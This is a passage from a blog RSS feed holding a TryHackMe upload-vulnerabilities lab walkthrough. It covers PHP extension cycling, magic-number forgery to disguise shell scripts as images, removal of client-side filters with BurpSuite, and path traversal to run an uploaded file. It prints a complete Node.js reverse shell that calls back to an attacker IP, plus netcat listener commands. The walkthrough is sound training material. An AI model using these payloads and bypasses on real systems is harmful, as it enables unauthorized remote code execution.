+<p><img src="/images/uv/anx-home.png" alt="anx-home"></p>
+<p>First, we will upload a standard file to the server. Successsfully doing so will simultaneously give us a file to look for in the server&rsquo;s upload destination directory and also start informing us of which file formats pass through the filter. I will use the same <code>coffee.png</code> clip art file from the previous task for this purpose.</p>
+<p>We then begin our investigation by running a <code>gobuster</code> scan of <code>annex.uploadvulns.thm</code>:</p>
+<pre tabindex="0"><code>gobuster dir -u annex.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o gb-annex
+</code></pre><p>The scan enumerates the following directories:</p>
+<pre tabindex="0"><code>1. /privacy (Status: 301) [Size: 332] [--&gt; http://annex.uploadvulns.thm/privacy/]
+2. /assets (Status: 301) [Size: 331] [--&gt; http://annex.uploadvulns.thm/assets/]
+</code></pre><p>While the <code>/assets</code> directory does not contain our uploaded image file, <code>/privacy</code> does. We note here that the filename has been modified to include date and time information before the existing name:</p>
+<p><img src="/images/uv/anx-assets.png" alt="anx-assets"></p>
+<p>From here, we try to upload our reverse shell script directly, but are given this error message, as our payload was filtered by the server.</p>
+<p><img src="/images/uv/anx-invalid.png" alt="anx-invalid"></p>
+<p>From our guided walkthrough earlier, we learned that there are multiple valid and server-executable <code>PHP</code> file extensions, including <code>.php3</code>, <code>.php4</code>, <code>.php5</code>, <code>.php7</code>, <code>.phps</code>, <code>.php-s</code>, <code>.pht</code> and <code>.phar</code>. With this knowledge, we can iterate through file extensions for our handy <code>ptm-shell.php</code> script.</p>
+<p><img src="/images/uv/anx-ext.png" alt="anx-ext"></p>
+<p>While we receive <code>File type is invalid</code> responses for 8 of the 9 files listed above, <code>ptm-shell.php5</code> makes it through the server&rsquo;s filter and into the <code>/privacy</code> directory.</p>
+<p><img src="/images/uv/anx-php5.png" alt="anx-php5"></p>
+<p>From here we simply invoke our <code>netcat</code> listener on our attack machine with:</p>
+<pre tabindex="0"><code>nc -lvnp 4444
+</code></pre><p>and then run the script by visiting the file&rsquo;s location in our browser.</p>
+<p><img src="/images/uv/anx-solution.png" alt="anx-solution"></p>
+<h2 id="task-9---bypassing-server-side-filtering-magic-numbers">Task 9 - Bypassing Server-Side Filtering: Magic Numbers</h2>
+<p>This task builds on the previous one, highlighting the use of &ldquo;magic number checking&rdquo; as an approach to server-side filtering.</p>
+<h3 id="methodology-2">Methodology</h3>
+<h4 id="evading-server-side-magic-number-based-filters">Evading server-side magic number-based filters</h4>
+<p>This task&rsquo;s walkthrough begins again with a webpage housing a file upload form. As is expected, <code>.php</code> files are caught in the server&rsquo;s filter, while <code>.jpeg</code> images are not.</p>
+<p>As we know that <code>.jpeg</code> files are permitted by the filter, we should be able to add the &ldquo;magic numbers&rdquo; <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">that correspond to this file type</a> to the top of our <code>.php</code> script. To do so, we first add 4 conventional characters (it does not matter which) to the top of our <code>ptm-shell.php</code> script.</p>
+<p>Next, we open the file in <code>hexeditor</code> (or an equivalent application) and change the conventional characters to <code>FF D8 FF DB</code> - the magic numbers for <code>.jpeg</code> format files. To check that this has been done properly, run:</p>
+<pre tabindex="0"><code>file ptm-shell.php
+</code></pre><p>This should return <code>ptm-shell.php: JPEG image data</code>.</p>
+<p>We are then able to upload our <code>.php</code> reverse shell script, now disguised as a <code>.jpeg</code> image, to the server and execute it.</p>
+<p>Before being given the challenge associated with this task, we are warned that directory indexing has been disabled on the target server.</p>
+<h4 id="question-91">Question 9.1</h4>
+<h5 id="what-is-the-flag-in-varwww-2">What is the flag in /var/www/?</h5>
+<p>Similar to past tasks, we begin by running a <code>gobuster</code> directory scan, which discovers:</p>
+<p><img src="/images/uv/magic-gb.png" alt="magic-gb"></p>
+<p>While we are not able to view the contents of these directories, due to thier non-indexable nature, we can remain confident that any uploaded files will be housed in one of these locations.</p>
+<p>Next, we will send the server some legitimate files to help us improve our understanding of the scope of allowable, unfiltered files that can be uploaded. When attempting to upload our basic test images, we receive the following message:</p>
+<p><img src="/images/uv/magic-gifsonly.png" alt="magic-gifsonly"></p>
+<p>Now that we know <code>.gif</code> files pass through the server&rsquo;s filter, we upload a new test image, <code>magic.gif</code> to the server and receive a <code>File successfully uploaded</code> message in place of the error message above.</p>
+<p>While navigating to <code>http://magic.uploadvulns.thm/assets/magic.gif</code> does not result in access to our uploaded test image, <code>http://magic.uploadvulns.thm/graphics/magic.gif</code> does. Thus, we conclucde that files uploaded to the server are directed to <code>http://magic.uploadvulns.thm/graphics/</code>.</p>
+<p>We will now attempt to disguise our favorite reverse shell script, <code>ptm-shell.php</code> as a <code>.gif</code> image file. Currently, it is recognized as:</p>
+<p><img src="/images/uv/magic-ft-php.png" alt="magic-ft-php"></p>
+<p>Using our <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">Wikipedia reference</a>, we find that <code>.gif</code> files use the &ldquo;magic numbers&rdquo; <code>47 49 46 38 37 61</code>. After adding our dummy characters, we use <code>hexeditor</code> to change the first six hex values to our new set of numbers.</p>
+<p><img src="/images/uv/magic-hex.png" alt="magic-hex"></p>
+<p>This results in our file being recognized as a <code>.gif</code> :</p>
+<p><img src="/images/uv/magic-disguised-php.png" alt="magic-disguised-php"></p>
+<p>We are then able to successfully upload <code>ptm-shell.php</code> to the server, activate our <code>netcat</code> listener, and execute the script by navigating to <code>http://magic.uploadvulns.thm/graphics/ptm-shell.php</code>. This spawns our reverse shell and gives us access to the flag.</p>
+<p><img src="/images/uv/magic-flag.png" alt="magic-flag"></p>
+<h2 id="task-10---example-methodology">Task 10 - Example Methodology</h2>
+<p>This task gives a useful broken-down overview of the process of auditing and exploiting file upload vulnerabilities on a given target. I will paraphrase the content below, but certainly encourage reading <a href="https://tryhackme.com/room/uploadvulns">the full version</a> in the THM room.</p>
+<h3 id="general-step-by-step-walkthrough">General step-by-step walkthrough</h3>
+<ol>
+<li>Surface-level analysis of the web page/site/application, as a whole.
+<ul>
+<li>Tools like <code>Wappalyzer</code> give insight into the languages and frameworks used in engineering the application.</li>
+<li>Interception of server responses via <code>BurpSuite</code> can also provide useful information.
+<ul>
+<li>Specifically, headers such as <code>server</code> or <code>x-powered-by</code> can yield essential server information.</li>
+</ul>
+</li>
+<li>At this point, analyzing the attack surface to identify a viable attack vector (e.g., a file upload page) becomes relevant, if necessary.</li>
+</ul>
+</li>
+<li>Inspect potential vulnerabilities (e.g., the aforementioned file upload page)
+<ul>
+<li>Client-side filtering scripts are a good first area to focus on, as they are low-hanging fruit in terms of our level of control over them.</li>
+</ul>
+</li>
+<li>Work to successfully upload a standard &ldquo;control&rdquo; file (i.e., one without any malicious inclusions or alterations) to the server
+<ul>
+<li>This allows us to learn more about the server&rsquo;s filtering logic, by beginning to build a list of acceptable uploads.</li>
+<li>Equally, this allows us to determine where on the server uploaded files are stored and if there are any restrictions in accessing files in this destination directory.</li>
+<li>After making progress on the above task, we can determine if the server renames uploads in accordance with a pre-determined scheme.
+<ul>
+<li>Importantly, the text notes that the <code>-x</code> flag in <code>gobuster</code> is helpful in the event that successfully uploaded files are difficult to locate.
+<ul>
+<li>For example, including <code>-x php,txt,html</code> in a <code>gobuster</code> command will append each of these extensions to the selected wordlist.</li>
+<li>This is especially useful in scenarios where the server is renaming uploaded files.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Begin attempting malicious file uploads
+<ul>
+<li>While we expect that server-side filters will stop us from directly delivering our payload, the information that can be derived from resulting error messages will further inform our approach.</li>
+<li>Here are four suggested considerations for beginning to circumvent server-side filters:
+<ol>
+<li>If files with clearly invalid extensions (e.g., <code>.invalidfileextension</code>) can be successfully uploaded, it is likely that the server is using a blacklist, instead of a whitelist.</li>
+<li>Changing the &ldquo;magic numbers&rdquo; of your &ldquo;control&rdquo; file (mentioned in step 3) to those of a likely or demonstrably filtered file extension can reveal if the server is using a filtering system that targets them.</li>
+<li>Similar to the above, intercepting upload submissions via <code>BurpSuite</code> and modifying the MIME identification headers can reveal if the server is filtering in this manner.</li>
+<li>If there are restrictions on uploaded files&rsquo; size/length, using progressively larger file sizes can allow for deducing the server&rsquo;s limit.</li>
+</ol>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="task-11---challenge">Task 11 - Challenge</h2>
+<h3 id="initial-investigation">Initial investigation</h3>
+<p>After downloading the provided wordlist, we navigate to <code>http://jewel.uploadvulns.thm/</code>. Immediately, <code>Wappalyzer</code> shows us several relevant technologies found on the page:</p>
+<p><img src="/images/uv/jewel-wap.png" alt="jewel-wap"></p>
+<p>From this, we learn that this site is running <a href="https://expressjs.com/">Express</a>, a <code>Node.js</code> web application framework. This means that our <code>ptm-shell.php</code> reverse shell script will almost certainly not work, as the server is configured to run <code>JavaScript</code> code.</p>
+<p>Luckily for us, the PayloadsAllTheThings <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs">Reverse Shell Cheat Sheet repository</a> on GitHub includes a reverse shell script for use with <code>Node.js</code>. Here it is:</p>
+<pre tabindex="0"><code>(function(){
+    var net = require(&#34;net&#34;),
+        cp = require(&#34;child_process&#34;),
+        sh = cp.spawn(&#34;/bin/sh&#34;, []);
+    var client = new net.Socket();
+    client.connect(4242, &#34;10.0.0.1&#34;, function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+</code></pre><p>After configuring the port and IP address above to match those of our attack machine, we can save this as <code>njs-shell.js</code> to use a bit later.</p>
+<h3 id="identifying-vulnerabilities">Identifying vulnerabilities</h3>
+<p>For more information, we can inspect the source code of the page, which includes a <code>.js</code> script called <code>/upload.js</code> that uses the following filtering scheme:</p>
+<p><img src="/images/uv/jewel-uploadjs.png" alt="jewel-uploadjs"></p>
+<p>Also, note this line in the source code of the home page:</p>
+<pre tabindex="0"><code>&lt;input id=&#34;fileSelect&#34; type=&#34;file&#34; name=&#34;fileToUpload&#34; accept=&#34;image/jpeg&#34;&gt;
+</code></pre><p>We can deduce, from the above code, that the server:</p>
+<ul>
+<li>Has a size/length limit in place</li>
+<li>Filters files that do not contain <code>ÿØÿ</code> as the first three &ldquo;magic number values&rdquo;
+<ul>
+<li>This corresponds with the first three <code>ISO</code> values for <code>.jpg</code> files</li>
+</ul>
+</li>
+<li>Filters files that do not have a <code>.jpg</code> or <code>.jpeg</code> file extension</li>
+</ul>
+<p>However, as this is a filtering mechanism that takes place client-side, we will be able to intercept the contents of the script and remove them via <code>BurpSuite</code>, so this should not be much of a problem for us when uploading our malicious payload.</p>
+<h3 id="finding-file-upload-destination">Finding file upload destination</h3>
+<p>Now we can work toward determinig where file uploads are stored on the server in order to access them.</p>
+<p>Next, we upload a standard image file, <code>jewel.jpg</code> to the server.</p>
+<p>The upload form on the home page tells us that we can upload an image and &ldquo;add it to the slides.&rdquo; This means that our uploaded image, <code>jewel.jpg</code>, should be stored in the same location as the rest of the slide images.</p>
+<p>By using the in-built Firefox Developer Tools, we can see that the other background slider images are stored in the server&rsquo;s <code>/content</code> directory.</p>
+<p><img src="/images/uv/jewel-sliderdir.png" alt="jewel-sliderdir"></p>
+<h3 id="more-enumeration">More enumeration</h3>
+<p>To get a better picture of the directory structure, we return to <code>gobuster</code>.</p>
+<p><img src="/images/uv/jewel-gb-dir.png" alt="jewel-gb-dir"></p>
+<p>While it seems as though our standard image upload was successful, unfortunately, navigating to <code>/content/jewel.jpg</code> does not give us direct access to the image (nor does<code>/modules/jewel.jpg</code>, <code>/assets/jewel.jpg</code>, or <code>/admin/jewel.jpg</code>).</p>
+<p>However, we note that navigating to the <code>/admin</code> page itself gives us access to a &ldquo;Top Secret!&rdquo; webform with which to activate modules from the <code>/modules</code> server directory, meaning that we can execute specific files.</p>
+<p><img src="/images/uv/jewel-admin-page.png" alt="jewel-admin-page"></p>
+<p>Next, we can try a more targeted <code>gobuster</code> scan in the server&rsquo;s <code>/content</code> directory, to try to find our uploaded <code>.jpg</code> file, using the downloadable wordlist presented to us by the THM task.</p>
+<p><img src="/images/uv/jewel-gb-jpg.png" alt="jewel-gb-jpg"></p>
+<p>In addition to <code>ABH.jpg</code>, <code>LKQ.jpg</code>, <code>SAD.jpg</code>, and <code>UAD.jpg</code>, which make up the slideshow images on the home page, we see <code>RNG.jpg</code>. To confirm that this is ours, we can visit <code>http://jewel.uploadvulns.thm/content/RNG.jpg</code> in our browser and ensure that our uploaded image file is visible.</p>
+<p><img src="/images/uv/jewel-uploaded.png" alt="jewel-uploaded"></p>
+<h3 id="bypassing-filters">Bypassing filters</h3>
+<p>Now that we have identified the destination of uploaded <code>/jpg</code> images to the server,
+we need to figure out how to get our <code>njs-shell.js</code> reverse shell past the upload filters, both client-side and server-side.</p>
+<p>Let us begin by renaming our <code>njs-shell.js</code> script to <code>njs-shell.jpg</code> to conform with the identified file extension for bypassing any (server-side) MIME filters that may exist. If we find that the server is incapable of executing our script with a <code>.jpg</code> ending, we can revisit.</p>
+<p>Our next step to successfully uploading our reverse shell will be to defeat this, which runs on our (client) browser when we load the <code>http://jewel.uploadvulns.thm</code> home page.</p>
+<p>We can do this in <code>BurpSuite</code> by removing the prohibitive code from  <code>upload.js</code> before the served content is rendered in our browser. To do so, we enable <code>interception</code> and refresh the page. Forward along each request until you reach the one related to <code>upload.js</code>, then right click the request space and choose <code>do intercept</code> then <code>response to this request</code>.</p>
+<p><strong>Note:</strong> If you have a cached version of <code>upload.js</code> and other site assets, you will not be able to edit the script, as the server will send a message confirming the validity of your cached script instead of its contents.</p>
+<p><img src="/images/uv/jewel-jsfilter.png" alt="jewel-jsfilter"></p>
+<p>After removing the necessary code, which we initially uncovered during the Identifying Vulnerabilities phase, we forward the new script to our browser. We can then successfully upload our <code>njs-shell.jpg</code> file to the server.</p>
+<p>In order to confirm our success, we can run another <code>gobuster</code> scan, which confirms the existence of <code>LED.jpg</code> in the <code>/content</code> directory.</p>
+<p><img src="/images/uv/jewel-jsjpg-upload.png" alt="jewel-jsjpg-upload"></p>
+<p>To activate our reverse shell and achieve RCE, we&rsquo;ll need to remember to enable our <code>netcat</code> listener with:</p>
+<pre tabindex="0"><code>nc -lvnp 4444
+</code></pre><p>Now we can navigate to the secret admin page that we identified at <code>http://jewel.uploadvulns.thm/admin</code> and determine how to activate our reverse shell via <code>http://jewel.uploadvulns.thm/content/LED.jpg</code>. The placeholder text of the form field tells us that we can input the location of files to execute from the <code>/modules</code> directory. From our previous More Enumeration efforts, we know that the <code>/content</code> directory sits adjacent to <code>/modules</code> under the root level of the server&rsquo;s filesystem. Thus, unless actively prohibited, we can use <code>../</code> to traverse directories. This means that by entering <code>../content/LED.jpg</code>, we should be able to activate our reverse shell script.</p>
+<p><img src="/images/uv/jewel-led-rce.png" alt="jewel-led-rce"></p>
+<p><em>et voilà!</em></p>
+<p>Thanks to <a href="https://tryhackme.com/p/MuirlandOracle">MuirlandOracle</a> for the informative room!</p>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p>i.e., without access to, or knowledge of, the source code.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
+]]></content>
+        </item>
+        
+        <item>
+            <title>On GitHub Pages</title>
+            <link>https://robscharf.github.io/posts/2022/04/on-github-pages/</link>
+            <pubDate>Mon, 11 Apr 2022 00:00:00 +0000</pubDate>
+            
+            <guid>https://robscharf.github.io/posts/2022/04/on-github-pages/</guid>
+            <description>Welcome to my new GitHub blog It&amp;rsquo;s powered by Hugo and is based on the excellent hello-friend-ng theme by Djordje Atlialp.</description>
+            <content type="html"><![CDATA[<h2 id="welcome-to-my-new-github-blog">Welcome to my new GitHub blog</h2>
+<p>It&rsquo;s powered by <a href="https://github.com/spf13/hugo/releases">Hugo</a> and is based on the excellent <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng#how-to-start">hello-friend-ng theme</a> by <a href="https://github.com/rhazdon">Djordje Atlialp</a>.</p>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
